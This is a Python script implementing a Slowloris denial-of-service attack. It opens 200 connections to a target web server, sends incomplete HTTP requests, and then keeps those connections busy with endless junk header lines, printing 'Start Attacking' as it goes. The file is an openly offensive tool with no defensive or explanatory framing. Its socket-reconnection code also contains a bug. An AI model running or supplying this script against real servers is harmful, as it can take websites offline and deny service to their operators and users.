import socket
import random
import time

def slowloris(ip):
    try:
        headers = [
            "User-agent: Mozilla/5.0 (Windows NT 6.3; rv:36.0) Gecko/20100101 Firefox/36.0",
            "Accept-language: en-US,en,q=0.5",
            "Connection: Keep-Alive"
        ]
        sockets = []

        #==Changeable Params==
        numberOfSockets = 200
        port = 80
        timeToSleep = 1
        #=====================

        print("Creating sockets...")
        for i in range(numberOfSockets):
            try:
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.settimeout(4)
                s.connect((ip, port))
                sockets.append(s)
            except Exception as e:
                print(e)
        num = 0
        for s in sockets:
            num += 1 
            s.send("GET /?{} HTTP/1.1\r\n".format(random.randint(0, 2000)).encode("utf-8"))
            for header in headers:
                s.send(bytes("{}\r\n".format(header).encode("utf-8")))
 
        print("Start Attacking " + ip)
        while True:
            for s in sockets:
                try:
                    print("Sending Packet...")
                    s.send("X-a: {}\r\n".format(random.randint(1,5000)).encode("utf-8"))
                except:
                    sockets.remove(s)
                    try:
                        s.socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                        s.settimeout(4)
                        s.connect((ip,port))
                        s.send("GET /?{} HTTP/1.1\r\n".format(random.randint(0,2000)).encode("utf-8"))

                        for header in headers:
                            s.send(bytes("{}\r\n".format(header).encode("utf-8")))
                    except:
                        pass
            print("sleeping for " + str(timeToSleep) + " seconds.")
            time.sleep(timeToSleep)

    except ConnectionRefusedError:
        slowloris(ip)